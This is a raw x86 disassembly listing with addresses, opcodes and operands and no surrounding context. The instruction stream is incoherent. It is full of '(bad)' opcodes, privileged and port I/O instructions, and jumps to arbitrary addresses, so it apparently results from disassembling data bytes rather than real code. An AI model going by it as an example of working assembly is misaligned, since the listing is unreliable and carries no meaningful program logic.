  41c24a:	aam    0x27
  41c24c:	dec    edx
  41c24d:	xor    BYTE PTR [eax],al
  41c24f:	nop
  41c250:	mov    al,0xc6
  41c252:	pop    ecx
  41c253:	xor    eax,eax
  41c255:	pop    ds
  41c256:	lahf   
  41c257:	sbb    BYTE PTR [edx],dh
  41c259:	sub    DWORD PTR [edx+0x1b],esp
  41c25c:	repnz push cs
  41c25e:	sti    
  41c25f:	aam    0x29
  41c261:	mov    al,ds:0x6d90f70d
  41c266:	fs call 0x39066621
  41c26c:	and    DWORD PTR [ecx-0x698e8796],ebp
  41c272:	pusha  
  41c273:	addr16 popf 
  41c275:	rcl    BYTE PTR [edx-0x11fa7dc0],1
  41c27b:	outs   dx,BYTE PTR ds:[esi]
  41c27c:	fnstsw WORD PTR [edi]
  41c27e:	add    DWORD PTR [esi+0x71fe40b],ecx
  41c284:	adc    ah,BYTE PTR [ecx]
  41c286:	push   ss
  41c287:	jne    0x41c2cf
  41c289:	mov    esp,0xb15ad486
  41c28e:	fadd   QWORD PTR [ebx-0x73cf3e93]
  41c294:	mov    ecx,ebx
  41c296:	je     0x41c22f
  41c298:	pop    edi
  41c299:	call   0x61726f2
  41c29e:	mov    esi,0x49725273
  41c2a3:	lods   eax,DWORD PTR ds:[esi]
  41c2a4:	fcomp  st(4)
  41c2a6:	pusha  
  41c2a7:	sar    DWORD PTR [ebx-0x53e6a98a],cl
  41c2ad:	dec    ebx
  41c2ae:	add    ah,dl
  41c2b0:	lahf   
  41c2b1:	mov    WORD PTR [edi+0x282aea6a],es
  41c2b7:	pop    ds
  41c2b8:	mov    BYTE PTR [edi],bh
  41c2ba:	iret   
  41c2bb:	(bad)  
  41c2bc:	in     al,dx
  41c2bd:	shr    BYTE PTR [ecx+0x51],cl
  41c2c0:	gs add ecx,esp
  41c2c3:	aaa    
  41c2c4:	cwde   
  41c2c5:	gs and eax,0x4d5c50e
  41c2cb:	and    eax,DWORD PTR [edi+0x254192bd]
  41c2d1:	data16 (bad) 
  41c2d3:	fisttp DWORD PTR [ecx-0x319a97a2]
  41c2d9:	add    eax,0xb86043aa
  41c2de:	bnd jbe 0x41c2c2
  41c2e1:	mov    ds:0x4788ca03,eax
  41c2e6:	or     bh,BYTE PTR [eax]
  41c2e8:	(bad)  
  41c2e9:	fs push ebp
  41c2eb:	inc    ecx
  41c2ec:	mov    esp,0xdd1f0a14
  41c2f1:	xor    eax,0x73245553
  41c2f6:	add    cl,BYTE PTR [edi-0x6b]
  41c2f9:	pop    ss
  41c2fa:	push   0xd942b519
  41c2ff:	jno    0x41c2d7
  41c301:	lds    edi,FWORD PTR [esi-0x2a]
  41c304:	jne    0x41c2c7
  41c306:	fcomp  DWORD PTR [ecx-0x80]
  41c309:	mov    ?,WORD PTR [eax-0xb]
  41c30c:	mov    esp,0xb6209090
  41c311:	pop    es
  41c312:	push   edx
  41c313:	dec    DWORD PTR [eax+0x2e001304]
  41c319:	lock not ebp
  41c31c:	mov    ah,0xfa
  41c31e:	aad    0x2e
  41c320:	add    DWORD PTR [ebx+esi*8-0x6d207623],ecx
  41c327:	mov    al,0xd
  41c329:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c32a:	add    dh,ah
  41c32c:	leave  
  41c32d:	add    eax,0x3267b4b6
  41c332:	dec    ecx
  41c333:	xchg   cl,bl
  41c335:	outs   dx,DWORD PTR ds:[esi]
  41c336:	pop    ebp
  41c337:	mov    DWORD PTR [edx-0x9],ecx
  41c33a:	loopne 0x41c394
  41c33c:	pop    es
  41c33d:	push   0xfffffff6
  41c33f:	loop   0x41c324
  41c341:	xor    al,0xe6
  41c343:	pop    ss
  41c344:	or     al,BYTE PTR [ebx]
  41c346:	mov    DWORD PTR ds:[esi+ebx*1-0x1b07a113],0x7a76ef6a
  41c352:	aad    0x54
  41c354:	mov    DWORD PTR [edx+ebx*8],esp
  41c357:	mov    dl,0xa4
  41c359:	add    bh,BYTE PTR [esi+0x21]
  41c35c:	les    esp,FWORD PTR [eax+ecx*8]
  41c35f:	shl    DWORD PTR [ecx+ebx*8-0x37ca20a0],cl
  41c366:	mov    al,0x37
  41c368:	xor    BYTE PTR [esi+0x5e3140a],dl
  41c36e:	enter  0xc210,0xff
  41c372:	xchg   edx,eax
  41c373:	mov    bl,0x64
  41c375:	lahf   
  41c376:	pusha  
  41c377:	or     esp,DWORD PTR [ebp+0x1894f92d]
  41c37d:	add    BYTE PTR [ebp-0x156f6246],dh
  41c383:	cmp    cl,cl
  41c385:	in     eax,dx
  41c386:	mov    esp,0x60be0f5f
  41c38b:	das    
  41c38c:	add    BYTE PTR [ebx-0x66577238],al
  41c392:	imul   edx,ebp,0x7a
  41c395:	push   edi
  41c396:	es xchg ecx,eax
  41c398:	adc    ch,BYTE PTR [ebp+0x2f]
  41c39b:	adc    cl,BYTE PTR [ecx+0x59601521]
  41c3a1:	inc    ebx
  41c3a2:	cwde   
  41c3a3:	sub    al,0xc7
  41c3a5:	dec    ebp
  41c3a6:	add    al,0x5e
  41c3a8:	aad    0x2
  41c3aa:	nop
  41c3ab:	(bad)  
  41c3ac:	loope  0x41c3b9
  41c3ae:	mov    al,0xbb
  41c3b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c3b1:	push   edi
  41c3b2:	stc    
  41c3b3:	jmp    0xd62e6553
  41c3b8:	jne    0x41c3eb
  41c3ba:	out    dx,al
  41c3bb:	sub    eax,0x8e6005e3
  41c3c0:	jne    0x41c3b6
  41c3c2:	sbb    DWORD PTR [ebp-0x64],0x452b1e69
  41c3c9:	xor    al,0x61
  41c3cb:	pop    edi
  41c3cc:	sbb    esp,DWORD PTR [eax]
  41c3ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c3cf:	imul   edi,DWORD PTR [ebp-0x299225aa],0xcc740802
  41c3d9:	in     al,dx
  41c3da:	pushf  
  41c3db:	test   BYTE PTR [eax-0x24f2df8f],0x9f
  41c3e2:	fcomp  st(1)
  41c3e4:	jno    0x41c3e9
  41c3e6:	nop
  41c3e7:	call   0x7005c426
  41c3ec:	test   BYTE PTR [eax+0x24aa8f1f],0xec
  41c3f3:	and    al,0xee
  41c3f5:	push   edi
  41c3f6:	mov    bh,0xd4
  41c3f8:	cli    
  41c3f9:	and    ecx,edx
  41c3fb:	push   0x90fa048d
  41c400:	(bad)  
  41c401:	fbstp  TBYTE PTR [edi+0x519cbd51]
  41c407:	xchg   ebp,eax
  41c408:	mov    esp,0x99d4f535
  41c40d:	pop    ecx
  41c40e:	add    ebp,DWORD PTR [ecx+ecx*2-0x16]
  41c412:	inc    eax
  41c413:	xchg   esp,eax
  41c414:	lea    ecx,[edi-0x18c95be5]
  41c41a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c41b:	fisttp WORD PTR [eax]
  41c41d:	add    edx,esp
  41c41f:	inc    ecx
  41c420:	xchg   ebp,eax
  41c421:	fnstenv [edi-0x5dba4973]
  41c427:	rol    DWORD PTR [eax+0x75d794d5],cl
  41c42d:	test   edi,ebp
  41c42f:	mov    ecx,0x57269340
  41c434:	iret   
  41c435:	shl    DWORD PTR [eax+0x79],cl
  41c438:	ja     0x41c3e4
  41c43a:	(bad)  
  41c43c:	push   ds
  41c43d:	cmp    eax,0x98cd72d
  41c442:	fstp   st(1)
  41c444:	retf   
  41c445:	pop    ss
  41c446:	(bad)  
  41c447:	leave  
  41c448:	outs   dx,DWORD PTR ds:[esi]
  41c449:	cld    
  41c44a:	pop    ds
  41c44b:	sbb    DWORD PTR [edi-0x315231c1],edx
  41c451:	push   ss
  41c452:	xchg   ecx,eax
  41c453:	aad    0x24
  41c455:	mov    dl,0x98
  41c457:	gs jne 0x41c433
  41c45a:	mov    al,0x9b
  41c45c:	icebp  
  41c45d:	or     eax,0x2a95fdc
  41c462:	pop    es
  41c463:	mov    esp,0x534edfc
  41c468:	mov    cl,0x3
  41c46a:	es jb  0x41c484
  41c46d:	push   0xfc8bb33a
  41c472:	mov    al,0x6c
  41c474:	daa    
  41c475:	inc    eax
  41c476:	cmp    dh,BYTE PTR [ecx-0xe]
  41c479:	xor    eax,0x64b1d446
  41c47e:	and    cl,BYTE PTR [esi-0x557cacea]
  41c484:	add    BYTE PTR [esi+0xb],0x5b
  41c488:	cmp    DWORD PTR cs:[edx+eiz*1-0x5f],0x892b78a2
  41c491:	add    eax,DWORD PTR [ecx-0x14b372be]
  41c497:	mov    edi,0x685e02da
  41c49c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c49d:	scas   al,BYTE PTR es:[edi]
  41c49e:	cwde   
  41c49f:	rol    BYTE PTR ss:[eax+0xa],cl
  41c4a3:	mov    dh,0x8f
  41c4a5:	mov    ebp,0x984f4fb1
  41c4aa:	jg     0x41c450
  41c4ac:	out    dx,al
  41c4ad:	repz fst st(4)
  41c4b0:	mov    ss,WORD PTR ds:0x3ebb7c65
  41c4b6:	jae    0x41c4e5
  41c4b8:	mov    ebp,ecx
  41c4ba:	test   eax,0xaac34ccc
  41c4bf:	fistp  DWORD PTR [edx-0x473ea9fb]
  41c4c5:	pusha  
  41c4c6:	jnp    0x41c479
  41c4c8:	outs   dx,BYTE PTR ds:[esi]
  41c4c9:	jo     0x41c4e9
  41c4cb:	jmp    0xf17edab7
  41c4d0:	sbb    dh,BYTE PTR [edx-0x6248446d]
  41c4d6:	and    BYTE PTR [ebx+0x5bc52849],bl
  41c4dc:	mov    ds:0xe0071e3e,eax
  41c4e1:	les    esi,FWORD PTR ds:0xea349775
  41c4e7:	js     0x41c521
  41c4e9:	sbb    DWORD PTR [esp+edx*8+0x1c],esi
  41c4ed:	dec    ebp
  41c4ee:	aas    
  41c4ef:	lahf   
  41c4f0:	hlt    
  41c4f1:	xor    bl,BYTE PTR [edi+0x28]
  41c4f4:	push   ebx
  41c4f5:	pop    ebp
  41c4f6:	push   ds
  41c4f7:	mov    DWORD PTR [edi],edx
  41c4f9:	les    ebx,FWORD PTR [ebp-0x835a388]
  41c4ff:	je     0x41c4b3
  41c501:	mov    gs,WORD PTR [ebp-0x39]
  41c504:	mov    cl,cl
  41c506:	sub    eax,0x4cf58d6e
  41c50b:	push   ecx
  41c50c:	mov    DWORD PTR [edi-0x3],edx
  41c50f:	cdq    
  41c510:	adc    al,0xb5
  41c512:	sub    BYTE PTR [edi+0x4762e269],dl
  41c518:	jle    0x41c502
  41c51a:	pusha  
  41c51b:	inc    edx
  41c51c:	js     0x41c4a7
  41c51e:	push   ebp
  41c51f:	or     DWORD PTR [eax-0x2b9ce051],eax
  41c525:	clc    
  41c526:	ret    0x4691
  41c529:	cmc    
  41c52a:	cmp    ah,dl
  41c52c:	pop    eax
  41c52d:	jb     0x41c4f0
  41c52f:	jl     0x41c543
  41c531:	test   eax,0xe27acd69
  41c536:	pop    ds
  41c537:	inc    ebx
  41c538:	in     al,dx
  41c539:	mov    ebp,0xc2745847
  41c53e:	add    edx,esp
  41c540:	nop
  41c541:	pshufw mm1,QWORD PTR [esi+0xb768f49],0xb2
  41c549:	inc    edi
  41c54a:	mov    ds:0x60a1269f,eax
  41c54f:	sbb    DWORD PTR [edx+0x40],eax
  41c552:	cmc    
  41c553:	mul    bl
  41c555:	and    al,0xd6
  41c557:	push   cs
  41c558:	xor    dh,BYTE PTR [ecx]
  41c55a:	pop    edi
  41c55b:	jge    0x41c574
  41c55d:	imul   DWORD PTR [eax+0x37]
  41c560:	mov    es,ecx
  41c562:	or     bl,bh
  41c564:	cwde   
  41c565:	into   
  41c566:	push   ebp
  41c567:	inc    esp
  41c568:	imul   edi,DWORD PTR [esi+0x1aaa271a],0x1f
  41c56f:	shl    DWORD PTR [ebx+eiz*1-0x301d174],1
  41c576:	pop    ds
  41c577:	cmc    
  41c578:	shr    dl,1
  41c57a:	adc    ch,BYTE PTR [edx+esi*1]
  41c57d:	aad    0x30
  41c57f:	aam    0xa7
  41c581:	mov    esi,0x72c0bfa7
  41c586:	or     eax,0x4015a483
  41c58b:	push   ebp
  41c58c:	mov    BYTE PTR [ebp-0x12],cl
  41c58f:	pop    es
  41c590:	jle    0x41c611
  41c592:	into   
  41c593:	ror    BYTE PTR [ebx],0x3
  41c596:	(bad)  
  41c597:	add    eax,0x1219cd35
  41c59c:	pop    edi
  41c59d:	fwait
  41c59e:	sbb    eax,0xcb998930
  41c5a3:	loope  0x41c60b
  41c5a5:	xor    edi,esi
  41c5a7:	pushw  0x5603
  41c5ab:	lock pop ecx
  41c5ad:	or     DWORD PTR ss:[eax-0x66],ebp
  41c5b1:	rcr    BYTE PTR [edi],0xbf
  41c5b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c5b5:	(bad)  
  41c5b6:	mov    dl,0x91
  41c5b8:	popa   
  41c5b9:	pop    ebx
  41c5ba:	data16 sahf 
  41c5bc:	dec    edi
  41c5bd:	cmp    DWORD PTR [edi],ebp
  41c5bf:	jae    0x41c587
  41c5c1:	(bad)  
  41c5c2:	pop    ds
  41c5c3:	jae    0x41c628
  41c5c5:	fistp  DWORD PTR [ebp+0x2d]
  41c5c8:	pusha  
  41c5c9:	rcr    cl,1
  41c5cb:	sar    BYTE PTR [esi+ecx*4-0x761c4f74],cl
  41c5d2:	ret    0x8a8e
  41c5d5:	or     eax,0xd6668fa6
  41c5da:	sahf   
  41c5db:	dec    ebx
  41c5dc:	sub    eax,DWORD PTR [ebx]
  41c5de:	xlat   BYTE PTR ds:[ebx]
  41c5df:	ds in  eax,dx
  41c5e1:	into   
  41c5e2:	dec    edi
  41c5e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c5e4:	iret   
  41c5e5:	add    dl,BYTE PTR [edx+ecx*8-0x74c401f]
  41c5ec:	icebp  
  41c5ed:	pop    ecx
  41c5ee:	add    DWORD PTR [edi],edx
  41c5f0:	aam    0x2d
  41c5f2:	push   ds
  41c5f3:	or     esi,DWORD PTR [edx]
  41c5f5:	xor    al,0xd2
  41c5f7:	pop    eax
  41c5f8:	int3   
  41c5f9:	add    DWORD PTR [eax],esp
  41c5fb:	jmp    0x41c646
  41c5fd:	add    esp,DWORD PTR [edx+0x1cd1e5aa]
  41c603:	imul   ebx,DWORD PTR [eax]
  41c606:	fs stc 
  41c608:	xchg   DWORD PTR [ebx+0x19],eax
  41c60b:	jg     0x41c58e
  41c60d:	push   ebp
  41c60e:	pop    ss
  41c60f:	sub    eax,0x70021536
  41c614:	pop    ebx
  41c615:	ins    DWORD PTR es:[edi],dx
  41c616:	pop    ss
  41c617:	xor    al,0xab
  41c619:	add    eax,0xb9876aad
  41c61e:	jge    0x41c612
  41c620:	iret   
  41c621:	sahf   
  41c622:	sub    BYTE PTR [eax-0x46],0x80
  41c626:	imul   edi,ecx,0xffffffb9
  41c629:	add    eax,0xaf83d7dc
  41c62e:	test   DWORD PTR ds:0x991f2b67,ebp
  41c634:	and    al,0x2e
  41c636:	dec    edi
  41c637:	fisub  WORD PTR [edi-0x60a5c74c]
  41c63d:	mov    bl,0x1f
  41c63f:	pop    ds
  41c640:	fidivr DWORD PTR [ebx+0x64279c09]
  41c646:	pop    ds
  41c647:	stc    
  41c648:	dec    edx
  41c649:	adc    bl,al
  41c64b:	out    dx,al
  41c64c:	mov    ah,0xd8
  41c64e:	adc    DWORD PTR [ebp+0x1d],0xffffffcb
  41c652:	in     eax,dx
  41c653:	out    0x24,eax
  41c655:	ret    
  41c656:	or     al,0x7a
  41c658:	mov    BYTE PTR [edi+0x54],ch
  41c65b:	sbb    ch,BYTE PTR [ebx-0x92740a6]
  41c661:	add    ah,BYTE PTR [eax-0x9583c9f]
  41c667:	daa    
  41c668:	sbb    eax,eax
  41c66a:	pusha  
  41c66b:	dec    ecx
  41c66c:	popa   
  41c66d:	int    0x35
  41c66f:	int3   
  41c670:	outs   dx,BYTE PTR ds:[esi]
  41c671:	in     al,dx
  41c672:	fcmovu st,st(0)
  41c674:	into   
  41c675:	or     dl,bl
  41c677:	aad    0xff
  41c679:	cmp    eax,DWORD PTR [edx-0x8]
  41c67c:	psubsb mm0,mm7
  41c67f:	fs jns 0x41c6d1
  41c682:	push   ds
  41c683:	popa   
  41c684:	imul   ecx,DWORD PTR [esi+0x6064e4b],0xf
  41c68b:	mov    esp,0xc8d62769
  41c690:	test   eax,0x7e111f68
  41c695:	pop    esi
  41c696:	jmp    0x41c663
  41c698:	push   0x62
  41c69a:	sahf   
  41c69b:	aad    0x83
  41c69d:	xchg   edi,eax
  41c69e:	fsubr  st,st(5)
  41c6a0:	(bad)  
  41c6a1:	(bad)  
  41c6a2:	sub    ebp,DWORD PTR [ebx-0x554f0678]
  41c6a8:	dec    edx
  41c6a9:	xchg   ecx,eax
  41c6aa:	nop
  41c6ab:	xchg   edi,eax
  41c6ac:	adc    BYTE PTR ds:0x68f48430,dl
  41c6b2:	adc    eax,0x2b861cd4
  41c6b7:	add    BYTE PTR [ecx-0x71bcc8ef],cl
  41c6bd:	dec    eax
  41c6be:	push   0xaa1ddc45
  41c6c3:	sbb    DWORD PTR [ebp-0x7c],0x4b29d5ca
  41c6ca:	cld    
  41c6cb:	hlt    
  41c6cc:	mov    DWORD PTR ds:0x43acfcb9,ecx
  41c6d2:	sub    DWORD PTR [ecx+0xd],esp
  41c6d5:	add    eax,esp
  41c6d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c6d8:	leave  
  41c6d9:	mov    esp,DWORD PTR [ecx]
  41c6db:	jns    0x41c739
  41c6dd:	cmp    bl,BYTE PTR [esp+ebx*1]
  41c6e0:	mov    BYTE PTR [ebp-0x2f],dh
  41c6e3:	out    0x5,al
  41c6e5:	ins    DWORD PTR es:[edi],dx
  41c6e6:	shl    DWORD PTR [ebx],1
  41c6e8:	xor    al,BYTE PTR [edx]
  41c6ea:	inc    esp
  41c6eb:	std    
  41c6ec:	out    0xb9,al
  41c6ee:	mov    ebx,0x1e70e56e
  41c6f3:	add    edx,DWORD PTR [edi+ebx*2]
  41c6f6:	lds    edx,FWORD PTR [ecx]
  41c6f8:	rcl    BYTE PTR [ebp+0x3810d4d5],0x9b
  41c6ff:	cmp    al,0x50
  41c701:	test   al,0xd2
  41c703:	fld    QWORD PTR [edi+0x28994c41]
  41c709:	enter  0xa6df,0xbe
  41c70d:	pop    es
  41c70e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c70f:	aam    0x70
  41c711:	jb     0x41c772
  41c713:	push   ss
  41c714:	mov    WORD PTR [edi+0x78],ds
  41c717:	test   eax,0xce02186
  41c71c:	or     esi,0x34f41ebf
  41c722:	jo     0x41c6f8
  41c724:	mov    bh,0xa4
  41c726:	xchg   edi,eax
  41c727:	and    BYTE PTR [ebx-0x7656b099],dl
  41c72d:	outs   dx,DWORD PTR ds:[esi]
  41c72e:	mov    al,0x13
  41c730:	arpl   WORD PTR [esi+0x1493e134],si
  41c736:	(bad)  
  41c738:	pop    ds
  41c739:	mov    esi,0x678b3554
  41c73e:	push   0xffffffee
  41c740:	pushf  
  41c741:	loope  0x41c73d
  41c743:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c744:	sub    al,0x52
  41c746:	pop    ds
  41c747:	retf   
  41c748:	jl     0x41c6e3
  41c74a:	pusha  
  41c74b:	jp     0x41c6e8
  41c74d:	add    bh,BYTE PTR [edx+0x472bc724]
  41c753:	jecxz  0x41c720
  41c755:	call   0x89c2a479
  41c75a:	dec    ebx
  41c75b:	mov    eax,ds:0x99abdd7e
  41c760:	pop    ebp
  41c761:	mov    esp,0x30a92e64
  41c766:	sbb    ah,dl
  41c768:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c769:	ret    0x4e2e
  41c76c:	clc    
  41c76d:	or     bl,BYTE PTR [edi]
  41c76f:	sbb    DWORD PTR [edi],0xffffffaf
  41c772:	cmp    BYTE PTR [esi-0x2b67266a],ch
  41c778:	mov    eax,0xe849ed04
  41c77d:	rol    DWORD PTR [ebp+0x3b238b70],1
  41c783:	jnp    0x41c7a9
  41c785:	retf   
  41c786:	jle    0x41c732
  41c788:	js     0x41c727
  41c78a:	adc    edi,edx
  41c78c:	sbb    BYTE PTR [ecx],0x57
  41c78f:	imul   esi,DWORD PTR ss:[edi+ecx*4-0x52],0x5d
  41c795:	retf   
  41c796:	jnp    0x41c7f9
  41c798:	aas    
  41c799:	cmp    BYTE PTR [eax],dh
  41c79b:	pop    ss
  41c79c:	rcr    al,cl
  41c79e:	(bad)  
  41c79f:	leave  
  41c7a0:	nop
  41c7a1:	sbb    edi,edx
  41c7a3:	inc    ebx
  41c7a4:	or     bh,BYTE PTR [ecx+0x27]
  41c7a7:	push   edi
  41c7a8:	jmp    0x878c4b10
  41c7ad:	mov    ch,0x18
  41c7af:	test   al,0x4e
  41c7b1:	inc    ebx
  41c7b2:	jle    0x41c7ac
  41c7b4:	ja     0x41c7e0
  41c7b6:	push   edx
  41c7b7:	xchg   ebp,eax
  41c7b8:	mov    ?,WORD PTR [edx]
  41c7ba:	nop
  41c7bb:	aam    0x83
  41c7bd:	push   edi
  41c7be:	fiadd  DWORD PTR [eax+0x52459893]
  41c7c4:	push   0x18e31f4a
  41c7c9:	or     DWORD PTR [esi-0x4d],0x3a7367df
  41c7d0:	xchg   ecx,eax
  41c7d1:	(bad)
  41c7d4:	mov    ecx,ebx
  41c7d6:	push   esi
  41c7d7:	jle    0x41c793
  41c7d9:	iret   
  41c7da:	(bad)  
  41c7db:	sub    BYTE PTR [eax+0x3],bl
  41c7de:	jp     0x41c7e0
  41c7e0:	inc    ecx
  41c7e1:	call   0x55b7:0xd8645261
  41c7e8:	jecxz  0x41c78d
  41c7ea:	pop    ds
  41c7eb:	mov    eax,ds:0x90536867
  41c7f0:	aad    0x2
  41c7f2:	scas   al,BYTE PTR es:[edi]
  41c7f3:	push   0x6595d53
  41c7f8:	sti    
  41c7f9:	mov    BYTE PTR [eax],cl
  41c7fb:	outs   dx,BYTE PTR ds:[esi]
  41c7fc:	lock cmp ebx,DWORD PTR [edx-0x76]
  41c800:	out    dx,eax
  41c801:	add    edi,DWORD PTR [ebp+edi*4-0x26]
  41c805:	test   edi,esi
  41c807:	cdq    
  41c808:	dec    esi
  41c809:	jmp    0x281d98f
  41c80e:	or     BYTE PTR [ecx+0x52],bh
  41c811:	out    0x42,eax
  41c813:	jae    0x41c84a
  41c815:	add    BYTE PTR [ebx+0x7d],0x17
  41c819:	aad    0x1f
  41c81b:	int    0xe8
  41c81d:	lahf   
  41c81e:	xor    ah,BYTE PTR [ebp+0x52]
  41c821:	add    dl,BYTE PTR [edx]
  41c823:	ret    0x4c83
  41c826:	jmp    0x64b3b4e7
  41c82b:	(bad)  
  41c82c:	adc    DWORD PTR [ecx],edx
  41c82e:	(bad)  
  41c82f:	fmul   QWORD PTR [ecx]
  41c831:	add    al,bl
  41c833:	jae    0x41c885
  41c835:	or     BYTE PTR [ecx+0xa472dd5],bh
  41c83b:	jmp    0x41c85b
  41c83d:	inc    ebp
  41c83e:	xchg   ebp,eax
  41c83f:	mov    ebp,0x5c596989
  41c844:	daa    
  41c845:	hlt    
  41c846:	sahf   
  41c847:	es add al,0x3
  41c84a:	dec    esi
  41c84b:	mov    bl,0x21
  41c84d:	cmp    ebp,DWORD PTR [edi+0x1e6fe396]
  41c853:	pop    edi
  41c854:	mov    dl,0x46
  41c856:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c857:	xor    al,0x2
  41c859:	push   edi
  41c85a:	lahf   
  41c85b:	adc    BYTE PTR [edi+eiz*4],dl
  41c85e:	dec    ecx
  41c85f:	in     al,0x8
  41c861:	es cs das 
  41c864:	rol    DWORD PTR [eax-0x6],1
  41c867:	fnsave [edx+0x786ecf0c]
  41c86d:	add    cl,BYTE PTR [edx]
  41c86f:	jle    0x41c8a6
  41c871:	jae    0x41c816
  41c873:	test   DWORD PTR [ebp+eiz*2+0x1cdf6565],0x426096f9
  41c87e:	cdq    
  41c87f:	dec    ecx
  41c880:	xor    eax,0x790f8802
  41c885:	sbb    ah,BYTE PTR ds:0x1fda3f6f
  41c88b:	xlat   BYTE PTR ds:[ebx]
  41c88c:	mov    dh,0xe8
  41c88e:	inc    esi
  41c88f:	sub    BYTE PTR [esp+eiz*8+0x7493d41e],bh
  41c896:	not    BYTE PTR [edx+esi*2-0x76b80106]
  41c89d:	fwait
  41c89e:	in     al,dx
  41c89f:	sbb    ebx,DWORD PTR [ebp-0x2a36cc19]
  41c8a5:	add    dh,BYTE PTR [ebx+eiz*8+0x59]
  41c8a9:	jle    0x41c8a1
  41c8ab:	stc    
  41c8ac:	ins    DWORD PTR es:[edi],dx
  41c8ad:	push   ecx
  41c8ae:	pop    ds
  41c8af:	aas    
  41c8b0:	push   edx
  41c8b1:	mov    esi,0x6442fc8f
  41c8b6:	inc    esp
  41c8b7:	aad    0x7f
  41c8b9:	out    dx,al
  41c8ba:	sub    ah,BYTE PTR [ecx]
  41c8bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c8bd:	adc    BYTE PTR ds:0x62fb8fc1,dh
  41c8c3:	mov    esp,0xd40a5734
  41c8c8:	rcr    DWORD PTR [edx+0x21e90a26],0x35
  41c8cf:	mov    cs,WORD PTR [edx+0x14337c1d]
  41c8d5:	jne    0x41c939
  41c8d7:	cmp    al,0x48
  41c8d9:	sbb    al,0x9d
  41c8db:	mov    ecx,0x2a1ba0ba
  41c8e0:	enter  0x6eb,0x52
  41c8e4:	sahf   
  41c8e5:	dec    esi
  41c8e6:	iret   
  41c8e7:	jmp    0x41c87d
  41c8e9:	add    eax,0xeee01162
  41c8ee:	int    0x1b
  41c8f0:	in     al,0x5
  41c8f2:	nop
  41c8f3:	adc    eax,0x866dd4c0
  41c8f8:	inc    edx
  41c8f9:	and    DWORD PTR [ebp+eax*2-0x7b],esp
  41c8fd:	sub    DWORD PTR [ecx+0x72837b21],esp
  41c903:	mov    ch,0xdb
  41c905:	pop    ss
  41c906:	mov    al,ds:0x7c9ed168
  41c90b:	jecxz  0x41c896
  41c90d:	bound  eax,QWORD PTR [esi+0xc]
  41c910:	aaa    
  41c911:	jge    0x41c961
  41c913:	dec    eax
  41c914:	xchg   DWORD PTR [edi-0x5fbe3a62],ebp
  41c91a:	aas    
  41c91b:	mov    bh,0x7a
  41c91d:	dec    esi
  41c91e:	stos   BYTE PTR es:[edi],al
  41c91f:	aam    0x63
  41c921:	mov    dh,0x23
  41c923:	dec    esp
  41c924:	ret    
  41c925:	arpl   WORD PTR [ebx],ax
  41c927:	mov    ds:0x79bdb789,al
  41c92c:	and    ch,bh
  41c92e:	mov    bh,0x26
  41c930:	in     eax,0xc3
  41c932:	shr    BYTE PTR [esi],1
  41c934:	pop    ecx
  41c935:	test   BYTE PTR [ebx-0x64],bl
  41c938:	dec    eax
  41c939:	jb     0x41c972
  41c93b:	add    ah,BYTE PTR [eax+ecx*1]
  41c93e:	jg     0x41c8fe
  41c940:	xchg   ecx,esp
  41c942:	sub    edx,esi
  41c944:	pop    edi
  41c945:	pop    esp
  41c946:	pop    esi
  41c947:	sbb    eax,0xd4dbdc86
  41c94c:	mov    eax,ds:0x18542bbc
  41c951:	add    al,0x83
  41c953:	push   ds
  41c954:	mov    cl,0xe3
  41c956:	add    al,0x45
  41c958:	or     BYTE PTR [ebx],bl
  41c95a:	push   esi
  41c95b:	ret    0xbada
  41c95e:	jae    0x41c935
  41c960:	(bad)  
  41c962:	jge    0x41c9a6
  41c964:	dec    esp
  41c965:	jp     0x41c9c8
  41c967:	out    dx,al
  41c968:	mov    DWORD PTR [ebx],ecx
  41c96a:	xor    cl,dh
  41c96c:	jne    0x41c94a
  41c96e:	icebp  
  41c96f:	ins    BYTE PTR es:[edi],dx
  41c970:	stos   DWORD PTR es:[edi],eax
  41c971:	retf   0x476b
  41c974:	xchg   esp,eax
  41c975:	ins    DWORD PTR es:[edi],dx
  41c976:	mov    DWORD PTR ds:[di],edi
  41c97a:	pop    eax
  41c97b:	mov    es,WORD PTR ds:0xe0f452d
  41c981:	jmp    0xdcf5:0xae9bef62
  41c988:	adc    ch,dh
  41c98a:	les    ebp,FWORD PTR [edi+0xa242fae]
  41c990:	aas    
  41c991:	add    esi,ebp
  41c993:	gs gs xor al,0x7
  41c997:	xchg   ebp,eax
  41c998:	xchg   edi,eax
  41c999:	cmp    eax,0x5dd3713
  41c99e:	push   eax
  41c99f:	dec    esi
  41c9a0:	(bad)  
  41c9a1:	sti    
  41c9a2:	mov    eax,0x526879c
  41c9a7:	ret    0x1588
  41c9aa:	iret   
  41c9ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c9ac:	jne    0x41c9b9
  41c9ae:	(bad)  
  41c9af:	dec    ebx
  41c9b0:	gs dec esp
  41c9b2:	push   ds
  41c9b3:	pop    es
  41c9b4:	lock imul esi,edi,0xc55d4c5e
  41c9bb:	aad    0x63
  41c9bd:	adc    ecx,DWORD PTR ds:[ecx-0x28]
  41c9c1:	(bad)  
  41c9c2:	pop    edi
  41c9c3:	pop    esp
  41c9c4:	mov    DWORD PTR ds:0x5c673592,ecx
  41c9ca:	fiadd  WORD PTR ds:0xd421f19a
  41c9d0:	(bad)  
  41c9d1:	ret    0x1c32
  41c9d4:	out    dx,al
  41c9d5:	ins    DWORD PTR es:[edi],dx
  41c9d6:	mov    bl,0x3e
  41c9d8:	mov    BYTE PTR [edi+0x2a863419],bh
  41c9de:	dec    esi
  41c9df:	ret    
  41c9e0:	aam    0x5
  41c9e2:	cmp    BYTE PTR [esi-0x336656d5],0xc7
  41c9e9:	xchg   DWORD PTR [eax+0x43],esp
  41c9ec:	xor    al,BYTE PTR [edx+0x3e48779c]
